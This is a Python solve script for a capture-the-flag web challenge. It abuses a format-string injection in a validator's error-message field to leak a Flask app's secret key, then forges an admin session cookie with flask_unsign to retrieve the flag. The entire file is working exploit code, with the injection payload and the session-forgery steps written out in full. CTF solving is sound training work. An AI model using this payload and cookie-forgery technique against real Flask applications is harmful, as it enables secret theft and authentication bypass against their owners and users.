#!/usr/bin/env python3

import requests
import flask_unsign

URL = "http://validator.chal.ctf.gdgalgiers.com"

if __name__ == "__main__":
    s = requests.Session()

    # Initialize session

    s.get(url=f"{URL}/")

    # Retrieve app secret key

    # error messages passed to Schema() support Python string formatting
    # We use that to access the secret key from the app
    payload = "{.__getattr__.__func__.__globals__[app].secret_key}"
    body = {
        "schema": {
            "name": "str",
        },
        "invalidMsg": payload,
        "data": "{}",
    }
    res = s.post(url=f"{URL}/validate", json=body, headers={"Content-Type": "application/json"})
    secret_key = res.json()["message"].split(": ")[1]
    print(f"[*] Secret key: {secret_key}")

    # Forge Flask session to access /flag route

    session = flask_unsign.sign({"isAdmin": True}, secret_key, legacy=True)
    print(f"[*] Forged session: {session}")
    s.cookies.set("session", session)
    res = s.get(url=f"{URL}/flag")
    flag = res.text
    print(f"[+] Flag: {flag}")
